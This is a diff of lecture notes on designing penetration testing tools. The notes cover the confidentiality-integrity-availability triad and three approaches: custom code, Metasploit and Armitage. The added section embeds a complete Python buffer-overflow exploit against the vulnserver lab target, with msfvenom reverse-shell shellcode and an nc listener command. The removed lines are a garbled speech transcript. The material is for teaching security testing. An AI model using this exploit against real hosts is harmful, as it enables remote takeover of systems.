@@ -1,5 +1,7 @@
 # Keep it Simple
 
+TO BE EDITTED
+
 We are going to first talk about what is UX design.
 UX means user experience. 
 Then we will talk about how we design our penetration testing tools and.
@@ -62,74 +64,105 @@ what is the authentication method for unlocking the smartphone screen?
 Passcode, face ID or touch ID?
 Face ID and touch ID are getting popular since they are pretty secure to some context, very convinient, and easy to use, compared with passcode.
 
-If you try to use software security tools, they are it's very
-complicated
-okay so now let's look at
-how do we actually design our kind of
-christian testing tool i'm i'm asking
-you
-okay
-and uh so let's look at a few options
-here so first
-we need to look at
-so why do we need a kind of intensity
-right and you can see here what is our
-goal here because you know
-your tool is to help users to achieve
-the goal
-and uh your customers your users
-are the penetration testing
-uh people right it's called the print
-testers
-so you are sending the tool for those
-seven secret people they are going to
-use their tool to scan the web to scan
-the network standard computers and to
-test if the computers are secure or not
-so here i give a few concepts here
-called compositionality integrity
-availability
-anybody knows what is competition energy
-what is competition energy
-it means you don't want your secret
-messages
-to be known to other people so for
-example encryption will do that
-so what is integrity
-integrity means if
-somebody changes your files you should
-be able to note
-right availability is what
-availability means okay when you
-actually want to use your own servers it
-should be up and running right
-so the first the
-penetration testing is very useful it
-will identify maybe many of
-those moderate visitors that will impact
-the cia
-okay and uh so that's why we need such
-tool because you want to identify
-okay if your computer's networks up
-properly secure or not right so that's
-why we need it for sure we need it
-okay
-so the problem is
-how can you do it
-i have actually
-let me tell you
-i have three options here first
-okay
-you tell your customer oh it's easy
-use python and
-use a python maybe software programming
-and you can actually program your own
-tool
-i'll tell you i give you tutorial
-instructions i sell you on this brochure
-you program your own tool okay this is
-the first approach
-second approach
+## Penetration Testing Tool UX Design
+### Goal of Penetration Testing Tools
+Why do we need a penetration testing tool?
+What is the goal of using a penetration testing tool?
+Such a tool will be used by penetration testers, who may scan the web,
+network and computers to test if anything is not secure.
+
+Here are a few concepts, confidentiality, integrity and availability (CIA).
+What is confidentiality? It means you don't want your secret
+messages to be known to other people.
+For example, encryption encrypts ypur messages and provides confidentiality.
+What is integrity? 
+integrity means if somebody changes your files you should
+be able to find they are changed.
+Availability means when you
+actually want to use a service, it should be up, running and providing the service.
+
+Penetration testing help achieve CIA.
+It will identify vulnerabilities, which may impact the CIA.
+That's why we need such tool.
+
+### Design Choices
+The problem is how you can implement the tool?
+Here are three options:
+- Programing a tool
+- Using Metasploit
+- Using Armitage
+
+### Method 1. Programing a Tool
+You are a programming guru. You tell your customer: It's easy; just
+use python to program a tool? Here are the programming documents. 
+So you sell you this brochure on how to program a penetration testing tool.
+
+```
+# To receive the reverse shell, run the following command at another terminal
+#   nc -l -v -p 4444
+# This module "socket" provides access to the BSD socket interface
+import socket
+# This module "struct" performs conversions between Python values
+# and C structs represented as Python bytes objects.
+import struct
+
+HOST = '10.0.2.7'   # vitcim IP
+PORT = 9999         # victim port
+
+# Shellcode created by msfvenom
+# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.8 LPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0a' 
+SHELL =  b""
+SHELL += b"\xba\xb7\x9a\xd6\x72\xd9\xea\xd9\x74\x24\xf4\x5e"
+SHELL += b"\x29\xc9\xb1\x52\x83\xc6\x04\x31\x56\x0e\x03\xe1"
+SHELL += b"\x94\x34\x87\xf1\x41\x3a\x68\x09\x92\x5b\xe0\xec"
+SHELL += b"\xa3\x5b\x96\x65\x93\x6b\xdc\x2b\x18\x07\xb0\xdf"
+SHELL += b"\xab\x65\x1d\xd0\x1c\xc3\x7b\xdf\x9d\x78\xbf\x7e"
+SHELL += b"\x1e\x83\xec\xa0\x1f\x4c\xe1\xa1\x58\xb1\x08\xf3"
+SHELL += b"\x31\xbd\xbf\xe3\x36\x8b\x03\x88\x05\x1d\x04\x6d"
+SHELL += b"\xdd\x1c\x25\x20\x55\x47\xe5\xc3\xba\xf3\xac\xdb"
+SHELL += b"\xdf\x3e\x66\x50\x2b\xb4\x79\xb0\x65\x35\xd5\xfd"
+SHELL += b"\x49\xc4\x27\x3a\x6d\x37\x52\x32\x8d\xca\x65\x81"
+SHELL += b"\xef\x10\xe3\x11\x57\xd2\x53\xfd\x69\x37\x05\x76"
+SHELL += b"\x65\xfc\x41\xd0\x6a\x03\x85\x6b\x96\x88\x28\xbb"
+SHELL += b"\x1e\xca\x0e\x1f\x7a\x88\x2f\x06\x26\x7f\x4f\x58"
+SHELL += b"\x89\x20\xf5\x13\x24\x34\x84\x7e\x21\xf9\xa5\x80"
+SHELL += b"\xb1\x95\xbe\xf3\x83\x3a\x15\x9b\xaf\xb3\xb3\x5c"
+SHELL += b"\xcf\xe9\x04\xf2\x2e\x12\x75\xdb\xf4\x46\x25\x73"
+SHELL += b"\xdc\xe6\xae\x83\xe1\x32\x60\xd3\x4d\xed\xc1\x83"
+SHELL += b"\x2d\x5d\xaa\xc9\xa1\x82\xca\xf2\x6b\xab\x61\x09"
+SHELL += b"\xfc\xde\x75\x13\xf4\xb6\x77\x13\x15\x1b\xf1\xf5"
+SHELL += b"\x7f\xb3\x57\xae\x17\x2a\xf2\x24\x89\xb3\x28\x41"
+SHELL += b"\x89\x38\xdf\xb6\x44\xc9\xaa\xa4\x31\x39\xe1\x96"
+SHELL += b"\x94\x46\xdf\xbe\x7b\xd4\x84\x3e\xf5\xc5\x12\x69"
+SHELL += b"\x52\x3b\x6b\xff\x4e\x62\xc5\x1d\x93\xf2\x2e\xa5"
+SHELL += b"\x48\xc7\xb1\x24\x1c\x73\x96\x36\xd8\x7c\x92\x62"
+SHELL += b"\xb4\x2a\x4c\xdc\x72\x85\x3e\xb6\x2c\x7a\xe9\x5e"
+SHELL += b"\xa8\xb0\x2a\x18\xb5\x9c\xdc\xc4\x04\x49\x99\xfb"
+SHELL += b"\xa9\x1d\x2d\x84\xd7\xbd\xd2\x5f\x5c\xdd\x30\x75"
+SHELL += b"\xa9\x76\xed\x1c\x10\x1b\x0e\xcb\x57\x22\x8d\xf9"
+SHELL += b"\x27\xd1\x8d\x88\x22\x9d\x09\x61\x5f\x8e\xff\x85"
+SHELL += b"\xcc\xaf\xd5"
+
+# Payload to inject into vulnserver
+PAYLOAD = (
+    b'KNOCK /.:/' +  # TRUN command of the server
+    b'A' * 2002 +   # padding 
+    # 62501205   FFE4             JMP ESP
+    # Return a bytes object.
+    # Format string '<L': < means little-endian;
+    # L means unsigned long
+    struct.pack('<L', 0x6250151C) + 
+    b'C' * 32 +
+    SHELL
+    # b'C' * (5000 - 2003 - 4 - 32 - len(SHELL)) # no need really
+)
+
+with socket.create_connection((HOST, PORT)) as fd:
+    fd.sendall(PAYLOAD)
+
+```
+
+
 is using metasploit so minus plus you
 have to run a few commands a lot of
 commands okay i'll show you
